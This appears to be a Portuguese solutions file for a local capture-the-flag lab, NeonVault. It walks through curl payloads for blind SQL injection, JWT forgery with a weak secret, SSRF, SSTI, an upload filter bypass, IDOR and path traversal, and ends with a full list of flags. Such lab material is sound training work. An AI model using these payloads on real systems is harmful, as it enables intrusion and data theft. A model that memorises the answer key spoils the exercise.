# Solutions — Lab 2 — NeonVault: Cyber Identity Breach

Use estas instrucoes apenas no ambiente local autorizado.

Antes de comecar:

```bash
cd lab-02-neonvault
docker compose up --build
```

Em outro terminal:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"
```

## 1. Time-Based Blind SQL Injection

A falha nao esta no login. O login rejeita payloads basicos. A superficie vulneravel e:

```text
GET /api/check-user?username=
```

O endpoint monta uma consulta insegura e aceita payloads com `SLEEP`.

Teste de atraso verdadeiro:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(2),0)-- "
```

Teste de atraso falso:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='X',SLEEP(2),0)-- "
```

Extraia o codigo curto do admin testando posicoes:

```text
SUBSTR(recovery_code,1,1)='N'
SUBSTR(recovery_code,2,1)='3'
SUBSTR(recovery_code,3,1)='O'
SUBSTR(recovery_code,4,1)='N'
```

Use o codigo recuperado:

```bash
curl -i -X POST http://127.0.0.1:8092/recover \
  -d "username=admin" \
  -d "recovery_code=N3ON"
```

Flag:

```text
FLAG{blind_sqli_extracted_admin}
```

## 2. JWT Weak Secret / Token Forgery

O login gera JWT com segredo fraco `neon` e role `user`.

Gerar token forjado com role admin:

```bash
TOKEN=$(docker compose exec -T neonvault node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8092/admin/core
```

Se estiver rodando sem Docker e com Node.js local instalado, o token tambem pode ser gerado com:

```bash
TOKEN=$(node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
```

Flag:

```text
FLAG{jwt_forged_neon_admin}
```

## 3. SSRF em Webhook Tester

Rota vulneravel:

```text
POST /tools/webhook
```

Descobrir servico interno:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/status"
```

Ler endpoint interno sensivel:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/flag"
```

Flag:

```text
FLAG{ssrf_internal_neon_service}
```

## 4. SSTI em Messages Preview

Rota vulneravel:

```text
POST /messages/preview
```

Prova:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{7*7}}"
```

O preview retorna `49`.

Ler segredo exposto no contexto do template:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{vault.sstiSecret}}"
```

Flag:

```text
FLAG{ssti_template_breach}
```

## 5. File Upload Bypass

Rota vulneravel:

```text
POST /avatar
```

O filtro valida extensoes de forma fraca e aceita nomes como `avatar.php.png`, `badge.html` e `template.phtml`.

Exemplo:

```bash
printf '<h1>NEON_UPLOAD_PROBE</h1>' > /tmp/badge.html
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/avatar \
  -F "avatar=@/tmp/badge.html;filename=badge.html"
```

Flag:

```text
FLAG{upload_filter_bypass}
```

## 6. SQL Injection em Filtro de Logs

Rota vulneravel:

```text
GET /logs?level=
```

Fluxo normal:

```bash
curl -i -b cookies.txt "http://127.0.0.1:8092/logs?level=error"
```

Filtro injetado:

```bash
curl -i -b cookies.txt -G http://127.0.0.1:8092/logs \
  --data-urlencode "level=error' OR '1'='1'-- "
```

Flag:

```text
FLAG{logs_filter_sqli}
```

## 7. IDOR em API de Tickets

Rota vulneravel:

```text
GET /api/tickets/:id
```

Ticket proprio:

```bash
curl -s -b cookies.txt http://127.0.0.1:8092/api/tickets/101
```

Ticket administrativo acessivel por troca de ID:

```bash
curl -s -b cookies.txt http://127.0.0.1:8092/api/tickets/777
```

Flag:

```text
FLAG{api_idor_object_leak}
```

## 8. Path Traversal com Logs e Backup

Rota vulneravel:

```text
GET /download?file=
```

Arquivo normal:

```bash
curl -i "http://127.0.0.1:8092/download?file=report.pdf"
```

Ler log fora da pasta publica:

```bash
curl -i "http://127.0.0.1:8092/download?file=../../var/log/neonvault/access.log"
```

O log aponta para:

```text
../../backup/legacy-admin-notes.bak
```

Ler backup legado:

```bash
curl -i "http://127.0.0.1:8092/download?file=../../backup/legacy-admin-notes.bak"
```

Flag:

```text
FLAG{traversal_follow_the_logs}
```

## Flags finais

```text
FLAG{blind_sqli_extracted_admin}
FLAG{jwt_forged_neon_admin}
FLAG{ssrf_internal_neon_service}
FLAG{ssti_template_breach}
FLAG{upload_filter_bypass}
FLAG{logs_filter_sqli}
FLAG{api_idor_object_leak}
FLAG{traversal_follow_the_logs}
```
